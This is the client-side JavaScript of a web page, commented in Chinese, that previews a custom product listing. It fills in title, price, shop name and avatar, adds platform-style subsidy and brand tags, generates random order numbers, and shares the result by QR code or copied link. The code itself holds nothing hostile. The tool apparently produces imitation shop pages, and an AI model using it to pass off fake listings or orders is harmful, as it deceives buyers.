		document.getElementById('preview-total').textContent = '¥' + total;
	}
	
	document.addEventListener('DOMContentLoaded', function() {
		// 生成客服二维码
		try {
		    new QRCode(document.getElementById("qrcode"), {
		        text: qrCodeUrl,
		        width: getQRSize(qrCodeUrl, 180),
		        height: getQRSize(qrCodeUrl, 180),
		        colorDark: "#000000",
		        colorLight: "#ffffff",
		        correctLevel: getQRCorrectLevel(qrCodeUrl)
		    });
		} catch(e) {
		    console.error('QR码生成失败，尝试降级:', e);
		    try {
		        document.getElementById("qrcode").innerHTML = '';
		        new QRCode(document.getElementById("qrcode"), {
		            text: qrCodeUrl,
		            width: 140,
		            height: 140,
		            colorDark: "#000000",
		            colorLight: "#ffffff",
		            correctLevel: QRCode.CorrectLevel.L
		        });
		    } catch(e2) {
		        document.getElementById("qrcode").innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:180px;height:180px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		    }
		}
		
		// 获取DOM元素
		const titleInput = document.getElementById('title-input');
		const priceInput = document.getElementById('price-input');
		const shopNicknameInput = document.getElementById('shop-nickname');
		const shopAvatarUpload = document.getElementById('shop-avatar-upload');
		const shopAvatarPreview = document.getElementById('shop-avatar-preview');
		const orderNumberInput = document.getElementById('order-number-input');
		const generateOrderBtn = document.getElementById('generate-order-btn');
		const uploadCover = document.getElementById('upload-cover');
		const uploadLabel = document.getElementById('upload-label');
		const descriptionInput = document.getElementById('description-input');
		const subsidySwitch = document.getElementById('subsidy-switch');
		const brandSwitch = document.getElementById('brand-switch');
		
		// 预览区域元素
		const previewPrice = document.getElementById('preview-price');
		const previewImage = document.getElementById('preview-image');
		const previewTitle = document.getElementById('preview-title');
		const previewDescription = document.getElementById('preview-description');
		const previewOrderNumber = document.getElementById('preview-order-number');
		const previewSubsidyTag = document.getElementById('preview-subsidy-tag');
		const previewBrandTag = document.getElementById('preview-brand-tag');
		const previewBadgeTitle = document.getElementById('preview-badge-title');
		const previewBadgeIcon = document.getElementById('preview-badge-icon');
		
		// 初始化订单号
		function initializeOrderNumber() {
			const initialOrderNumber = generateOrderNumber();
			orderNumberInput.value = initialOrderNumber;
			previewOrderNumber.textContent = initialOrderNumber;
		}
		
		// 价格输入监听
		priceInput.addEventListener('input', function() {
			const price = this.value;
			previewPrice.textContent = price ? '¥' + price : '¥0';
			updateDiscountAndTotal(price);
		});
		
		// 标题输入监听
		titleInput.addEventListener('input', function() {
			previewTitle.textContent = this.value || '商品标题';
		});
		
		// 商品描述输入监听
		descriptionInput.addEventListener('input', function() {
			previewDescription.textContent = this.value || '商品描述';
		});
		
		// 店铺昵称输入监听
		shopNicknameInput.addEventListener('input', function() {
			const shopName = this.value;
			previewBadgeTitle.textContent = shopName || '店铺昵称';
		});
		
		// 店铺头像上传监听
		shopAvatarUpload.addEventListener('change', function(e) {
			const file = e.target.files[0];
			if (file) {
				const reader = new FileReader();
				reader.onload = function(e) {
					const avatarUrl = e.target.result;
					// 更新表单区域的头像预览
					if (shopAvatarPreview) {
						shopAvatarPreview.src = avatarUrl;
					}
					// 更新预览区域的店铺头像
					if (previewBadgeIcon) {
						previewBadgeIcon.src = avatarUrl;
					}
				};
				reader.readAsDataURL(file);
			}
		});
		
		// 百亿补贴开关监听
		subsidySwitch.addEventListener('change', function() {
			previewSubsidyTag.style.display = this.checked ? 'inline-block' : 'none';
		});
		
		// 品牌标签开关监听
		brandSwitch.addEventListener('change', function() {
			previewBrandTag.style.display = this.checked ? 'inline-block' : 'none';
		});
		
		// 生成订单号按钮监听
		generateOrderBtn.addEventListener('click', function() {
			const newOrderNumber = generateOrderNumber();
			orderNumberInput.value = newOrderNumber;
			previewOrderNumber.textContent = newOrderNumber;
		});
		
		// 封面图上传监听
		uploadCover.addEventListener('change', function(e) {
			const file = e.target.files[0];
			if (file) {
				const reader = new FileReader();
				reader.onload = function(e) {
					previewImage.src = e.target.result;
					uploadLabel.textContent = '已上传';
				};
				reader.readAsDataURL(file);
			}
		});
		
		// 复制订单号
		document.getElementById('copy-order-btn').addEventListener('click', function() {
			const orderNumber = previewOrderNumber.textContent;
			navigator.clipboard.writeText(orderNumber).then(function() {
				alert('订单号已复制到剪贴板');
			}).catch(function(err) {
				console.error('复制失败: ', err);
			});
		});
		
		
		
		// 初始化页面
		initializeOrderNumber();
	});
</script>
<script>
    function copyToClipboard(text) {
        return new Promise(function(resolve, reject) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(function() {
                    resolve(true);
                }).catch(function(err) {
                    console.error('复制失败:', err);
                    fallbackCopy(text, resolve, reject);
                });
            } else {
                fallbackCopy(text, resolve, reject);
            }
        }).then(function(success) {
            if (success) {
                showToast('链接已复制到剪贴板！', 'success');
            } else {
                showToast('复制失败，请手动复制', 'error');
            }
        });
    }

    function fallbackCopy(text, resolve, reject) {
        var textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
            var successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            resolve(successful);
        } catch (err) {
            console.error('复制失败:', err);
            document.body.removeChild(textArea);
            resolve(false);
        }
    }

    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        var copyLinkBtn = document.getElementById('copy-link-btn');
        if (copyLinkBtn) {
            copyLinkBtn.addEventListener('click', function() {
                copyToClipboard(qrCodeUrl);
            });
        }
    });
</script>

</body>
</html>